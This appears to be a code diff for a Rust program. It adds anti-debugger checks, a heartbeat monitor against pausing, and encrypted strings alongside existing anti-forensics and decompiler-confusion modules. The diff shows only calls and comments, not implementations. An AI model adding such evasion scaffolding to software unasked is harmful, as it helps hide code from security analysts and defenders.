@@ -28,6 +28,9 @@ mod chronos;  // Temporal Integrity (NTP)
 mod chaos;    // Entropy Ocean (Anti-Forensics)
 mod math_trap; // Opaque Predicates (Decompiler Confusion)
 mod black_hole; // Deep Clean (Windows Updates, etc.)
+mod heisenberg; // Integrity Scan (Anti-Debugger)
+mod heartbeat;  // Ghost Heartbeat (Anti-Pause)
+mod dark_matter; // Encrypted Strings
 
 // --- 🛠️ ENGINEERING: RAII COM GUARD ---
 struct ComGuard;
@@ -90,8 +93,19 @@ async fn main() -> Result<()> {
     std::thread::spawn(move || {
         let _guard = ComGuard::new().unwrap(); 
         
-        // ANTI-ANALYSIS (Ghost Protocol)
-        // 0. Parent Validation (Void)
+        // ANTI-ANALYSIS (Ghost Protocol & Neutron Star)
+        // 0. Heisenberg Principle (Do this FIRST before they attach)
+        if !heisenberg::verify_integrity() {
+             // We detected a software breakpoint on Entry Point.
+             // Immediate Crash.
+             security::crash_dummy();
+             std::process::exit(1);
+        }
+
+        // 0.2. Ghost Heartbeat (Start Monitor)
+        heartbeat::start_monitor();
+        
+        // 0.3. Parent Validation (Void)
         if !security::is_safe_parent() {
              std::process::exit(0); // Silently exit if launched by untrusted parent
         }
